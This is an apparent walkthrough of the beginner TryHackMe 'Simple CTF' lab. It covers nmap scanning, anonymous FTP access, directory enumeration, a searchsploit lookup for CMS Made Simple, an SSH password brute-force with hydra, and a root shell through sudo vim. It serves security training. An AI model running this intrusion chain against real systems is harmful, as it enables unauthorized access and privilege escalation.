# Simple CTF

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information
```
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: Beginner level ctf
```
Room link: [https://tryhackme.com/r/room/easyctf](https://tryhackme.com/r/room/easyctf)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap` on all ports
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ nmap -v -sV -sC -p- 10.10.167.216  
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-23 19:23 CEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating Ping Scan at 19:23
Scanning 10.10.167.216 [2 ports]
Completed Ping Scan at 19:23, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:23
Completed Parallel DNS resolution of 1 host. at 19:23, 0.00s elapsed
Initiating Connect Scan at 19:23
Scanning 10.10.167.216 [65535 ports]
Discovered open port 80/tcp on 10.10.167.216
Discovered open port 21/tcp on 10.10.167.216
Connect Scan Timing: About 17.96% done; ETC: 19:26 (0:02:22 remaining)
Connect Scan Timing: About 46.08% done; ETC: 19:25 (0:01:11 remaining)
Discovered open port 2222/tcp on 10.10.167.216
Completed Connect Scan at 19:25, 106.98s elapsed (65535 total ports)
Initiating Service scan at 19:25
Scanning 3 services on 10.10.167.216
Completed Service scan at 19:25, 6.14s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.167.216.
Initiating NSE at 19:25
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 19:25, 35.34s elapsed
Initiating NSE at 19:25
Completed NSE at 19:25, 0.33s elapsed
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
Nmap scan report for 10.10.167.216
Host is up (0.045s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.61.233
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.41 seconds
```
We have three services running:
- vsftpd v3.0.3 on port 21
- Apache httpd v2.4.18 on port 80
- OpenSSH v7.2p2 on port 2222

Browsing manually to port 80 shows an `Apache2 Ubuntu Default Page`.

### Check for files on the FTP-server

Let's start by checking out the FTP-server
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ ftp 10.10.167.216  
Connected to 10.10.167.216.
220 (vsFTPd 3.0.3)
Name (10.10.167.216:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46029|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> mget For*
mget ForMitch.txt [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |************************************************************************************************************************|   166      225.46 KiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (3.57 KiB/s)
ftp> close
221 Goodbye.
ftp> quit

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```
Ah, we have a user (`Mitch`) with a weak password.

### Scan for web content with gobuster

Next, let's try to identify common directories with `gobuster`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.167.216    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.167.216
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 315] [--> http://10.10.167.216/simple/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```
The page `/manager` sounds promising.

### Analyse the web page

When checking the webpage (`http://10.10.167.216/simple/`) we see that it is `CMS Made Simple version v2.2.8`.

We ought to check if there are any know vulnerabilities for this version
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ searchsploit CMS Made Simple              
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                 | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                            | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                            | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                         | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                             | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                            | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                  | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                                        | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                               | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                   | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                                       | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                                      | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                   | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                   | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                                      | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                            | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                                     | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                   | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                                      | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                     | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                       | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                           | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                        | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                       | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                           | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                      | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                      | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                                    | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                                           | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                   | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                              | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                     | php/webapps/46546.py
CmsMadeSimple v2.2.17 - Remote Code Execution (RCE)                                                                                | php/webapps/51600.txt
CmsMadeSimple v2.2.17 - session hijacking via Server-Side Template Injection (SSTI)                                                | php/webapps/51599.txt
CmsMadeSimple v2.2.17 - Stored Cross-Site Scripting (XSS)                                                                          | php/webapps/51601.txt
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                     
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ searchsploit -m 46635       
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Simple_CTF/46635.py
```

### Brute-force the password for Mitch

We can try to crack the password for `Mitch` with `hydra`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ hydra -P /usr/share/wordlists/rockyou.txt -l mitch -s 2222 ssh://10.10.167.216
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-23 20:02:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.167.216:2222/
[2222][ssh] host: 10.10.167.216   login: mitch   password: secret
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-23 20:03:06
```
The password is `secret`.

### Get the user flag

Now we can login a mitch via ssh a get the user flag
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ ssh -p 2222 mitch@10.10.167.216
The authenticity of host '[10.10.167.216]:2222 ([10.10.167.216]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.167.216]:2222' (ED25519) to the list of known hosts.
mitch@10.10.167.216's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G<REDACTED>!
$ 
```

We can also check what other users are present
```bash
$ ls -l /home
total 8
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
$ 
```

### Privilege escalation

Let's start our enumeration by checking if we can run commands as root with `sudo`
```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```
Yes, we can run `vim` as root without a password!

### Get the root flag

We can use this trick from [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) to get a shell via `vim` and then get the root flag
```bash
$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
W<REDACTED>!
# 
```
Nice!

For additional information, please see the references below.

## References

- [Gobuster - Github](https://github.com/OJ/gobuster/)
- [GTFOBins - vim](https://gtfobins.github.io/gtfobins/vim/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [vim - Linux manual page](https://linux.die.net/man/1/vi)
- [Wikipedia - Apache HTTP Server](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [Wikipedia - OpenSSH](https://en.wikipedia.org/wiki/OpenSSH)
